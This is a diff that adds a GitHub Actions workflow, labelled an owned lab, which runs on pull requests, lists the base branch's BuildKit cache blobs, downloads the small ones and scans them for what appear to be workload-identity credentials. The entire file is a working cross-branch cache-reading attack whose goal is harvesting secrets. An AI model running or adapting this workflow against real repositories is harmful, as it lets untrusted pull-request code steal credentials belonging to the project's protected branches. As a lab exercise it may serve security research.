@@ -1,0 +1,45 @@
+name: Owned lab PR cache reader
+on:
+  pull_request:
+permissions:
+  contents: read
+  actions: read
+jobs:
+  read-base-cache:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: ./gha-runtime-env-action
+      - uses: actions/setup-go@v5
+        with:
+          go-version: '1.23'
+      - name: Install cache reader dependencies
+        run: |
+          go get github.com/tonistiigi/go-actions-cache@54bc28c26fd2ab598cce3f9d3368744bc7b3fb58
+          python -m pip install --disable-pip-version-check zstandard
+      - name: List base-branch BuildKit blobs
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          gh cache list --ref "refs/heads/${{ github.event.pull_request.base.ref }}" \
+            --limit 100 --json key,sizeInBytes \
+            --jq '.[] | select(.key | startswith("buildkit-blob-1-sha256:")) | [.key,.sizeInBytes] | @tsv' \
+            > blob-keys.tsv
+          cat blob-keys.tsv | sed 's/sha256:.*/sha256:[redacted]/'
+      - name: Download and scan small blobs
+        shell: bash
+        run: |
+          mkdir -p blobs
+          found=0
+          while IFS=$'\t' read -r key size; do
+            [ -n "$key" ] || continue
+            # Keep this lab bounded. The source COPY layer should be small.
+            if [ "$size" -gt 50000000 ]; then continue; fi
+            safe=$(printf '%s' "$key" | sha256sum | cut -c1-16)
+            go run ./gha_cache_blob_downloader.go -key "$key" -out "blobs/$safe.bin"
+            if python ./scan_buildkit_wif_blob.py "blobs/$safe.bin" --json; then
+              found=1
+              break
+            fi
+          done < blob-keys.tsv
+          test "$found" = 1
